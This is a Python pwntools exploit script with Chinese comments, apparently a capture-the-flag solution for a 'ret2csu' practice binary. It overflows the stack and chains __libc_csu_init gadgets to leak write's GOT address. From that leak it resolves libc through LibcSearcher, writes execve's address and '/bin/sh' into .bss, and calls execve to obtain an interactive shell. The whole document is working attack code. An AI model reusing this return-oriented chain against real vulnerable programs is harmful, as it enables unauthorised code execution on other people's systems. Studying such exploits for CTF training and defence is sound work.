from pwn import *
from LibcSearcher import *

elf = ELF('./ret2csu')
sh = process('./ret2csu')

write_got = elf.got['write'] 		#获取write函数的got地址
read_got = elf.got['read']				#获取read函数的got地址
main_addr = elf.symbols['main']  #获取main函数的函数地址
bss_base = elf.bss()							#获取bss段地址
p2 = 0x00000000004005F0 
#gadget2
p1 = 0x0000000000400606
#gadget1

def com_gadget(null, rbx, rbp, r12, r13, r14, r15, main):
  #null为0x8空缺
  #main为main函数地址
    payload = b'a' * 0x88 			#0x80+8个字节填满栈空间至ret返回指令
    payload += p64(p1) 
    payload += p64(null) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(p2)
    payload += b'a' * 56     #56个字节填充平衡堆栈造成的空缺
    payload += p64(main)
    sh.send(payload)    
    sleep(1)						#暂停等待接收

sh.recvuntil('Hello, World\n')
#利用write函数打印write函数地址并返回main函数
com_gadget(0,0, 1, write_got, 1, write_got, 8, main_addr)

write_addr = u64(sh.recv(8))    #接收write函数地址
libc = LibcSearcher('write', write_addr)	#查找libc版本
libc_base = write_addr - libc.dump('write') #计算该版本libc基地址
execve_addr = libc_base + libc.dump('execve') #查找该版本libc execve函数地址，亲测貌似system不行.png

sh.recvuntil('Hello, World\n')
#read函数布局，将execve函数地址和/bin/sh字符串写进bss段首地址
com_gadget(0,0, 1, read_got, 0, bss_base, 16, main_addr)
sh.send(p64(execve_addr) + b'/bin/sh\x00')#凑足十六位

sh.recvuntil('Hello, World\n')
#调用bss段中的execve('/bin/sh')
com_gadget(0,0, 1, bss_base, bss_base+8, 0, 0, main_addr)
sh.interactive()
